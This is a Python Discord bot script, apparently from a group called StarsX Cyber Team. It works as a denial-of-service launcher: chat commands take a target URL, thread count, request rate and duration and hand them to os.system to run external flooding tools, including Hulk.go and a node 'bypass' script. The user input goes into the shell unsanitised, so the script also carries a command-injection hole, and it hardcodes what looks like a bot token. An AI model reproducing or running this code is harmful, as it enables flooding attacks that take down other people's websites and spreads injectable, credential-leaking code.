#Script By PermenMD From StarsX Cyber Team
#Do Not Sell This Bot And Tools

import discord
from discord.ext import commands
import threading
import requests
import time
import os

TOKEN = 'MTE3MzI2MDM1MzYzMTY5MDg0Mg.GCThie.960cW4h0VvlY4N76MMpTpECpjPKMb6KxXzPPOk'
ALLOWED_CHANNEL_ID = 1175685721294635090 # Replace with your desired channel ID

client = commands.Bot(command_prefix='!', intents = discord.Intents.all())

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.command(name='big')
async def big(ctx, url, methods):
         embed = discord.Embed(title="🚀 **StarsX Tester** 🚀", color=discord.Colour.random())
         embed.set_thumbnail(url="https://s5.gifyu.com/images/S8OoK.gif")
         embed.add_field(name="**Target**", value=f"`{url}`")
         embed.add_field(name="**Methods**", value="`StarsXNuke`")
         embed.add_field(name="**Get/Post**", value=f"`{methods}`")
         embed.add_field(name="**Duration**", value=f"`30`")
         embed.set_footer(text=f"© Owner : permenmd ", icon_url=ctx.author.avatar)
         await ctx.send(embed=embed)

         os.system(f"go run Hulk.go -site {url} -data {methods} ")

@client.command(name='flood')
async def flood(ctx, url, threads, methods, time):
         embed = discord.Embed(title="🚀 **StarsX Tester** 🚀", color=discord.Colour.random())
         embed.set_thumbnail(url="https://s5.gifyu.com/images/S8OoK.gif")
         embed.add_field(name="**Target**", value=f"`{url}`")
         embed.add_field(name="**Methods**", value="`StarsXFlood`")
         embed.add_field(name="**Threads**", value=f"`{threads}`")
         embed.add_field(name="**Duration**", value=f"`{time}`")
         embed.add_field(name="**Protocol**", value=f"`{methods}`")
         embed.set_footer(text=f"© Owner : permenmd ", icon_url=ctx.author.avatar)
         await ctx.send(embed=embed)

         os.system(f"go run flood.go {url} {threads} {methods} {time} header.txt")
         
@client.command(name='Bypass')
async def Bypass(ctx, url, threads, rps, methods, time):
         embed = discord.Embed(title="🚀 **StarsX Tester** 🚀", color=discord.Colour.random())
         embed.set_thumbnail(url="https://s5.gifyu.com/images/S8OoK.gif")
         embed.add_field(name="**Target**", value=f"`{url}`")
         embed.add_field(name="**Methods**", value="`StarsXBypassed`")
         embed.add_field(name="**Attack Name**", value=f"`{methods}`")
         embed.add_field(name="**Threads**", value=f"`{threads}`")
         embed.add_field(name="**Duration**", value=f"`{time}`")
         embed.add_field(name="**Request Per IP**", value=f"`{rps}`")
         embed.set_footer(text=f"© Owner : permenmd ", icon_url=ctx.author.avatar)
         await ctx.send(embed=embed)

         os.system(f"node index.js {url} {time} {threads} {rps} {methods}")
         
@client.command(name='usage')
async def usage(ctx):
        embed = discord.Embed(title=="🚀 **StarsX Tester** 🚀", color=discord.Colour.green())
        embed.set_thumbnail(url="https://s5.gifyu.com/images/S8OoK.gif")
        embed.add_field(name="**flood**", value="`!flood url threads methods time`")
        embed.add_field(name="**big**", value="`!big url get/post`")
        embed.add_field(name="**bypass**", value="`!bypass url threads rps methods time`")
        embed.set_footer(text=f"© Owner : permenmd ", icon_url=ctx.author.avatar)
        await ctx.send("**Jangan Spam Ya Tod**")
        await ctx.send(embed=embed)
client.run(TOKEN)